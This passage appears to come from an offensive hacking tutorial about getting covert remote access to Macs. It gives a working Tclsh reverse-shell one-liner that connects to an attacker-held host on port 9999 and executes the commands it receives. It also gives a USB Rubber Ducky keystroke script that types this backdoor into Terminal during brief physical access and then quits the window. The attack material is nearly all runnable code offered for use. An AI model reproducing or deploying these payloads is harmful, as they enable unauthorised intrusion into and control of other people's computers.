As mentioned, creating Netcat backdoors can be established with minimal characters, making it the ideal method for quickly getting remote access to a Mac desktop or laptop. However, if the MacBook or other macOS device suddenly goes to sleep, locks, or the Wi-Fi connection is lost while the attacker is issuing remote commands, the Netcat process may become frozen and fail to terminate; This ultimately leaves the attacker with no new way to remotely access the device.

Fortunately, Tclsh handles sudden disconnections gracefully and is already present in all macOS devices. If you're a macOS user, you can test this by opening a Terminal and typing tclsh. You'll find that ls and ifconfig function as expected.

Start a Netcat Listener:

	nc -l -p 9999 (on mac)

Execute the Tclsh Command:

	echo 'set s [socket 1.2.3.4 9999];while 42 { puts -nonewline $s "hacker> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh &

Rubber Ducky Payloads: (optional)

Let's focus on using a USB Rubber Ducky to execute the command where a few seconds of physical access is possible. Below is an example payload.

Rubber Ducky Script:

	DELAY 1500
	GUI SPACE
	DELAY 350
	STRING terminal
	DELAY 100
	ENTER
	DELAY 1000
	STRING echo 'set s [socket 1.2.3.4 9999];while 42 { puts -nonewline $s "hacker> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh &
	ENTER
	GUI q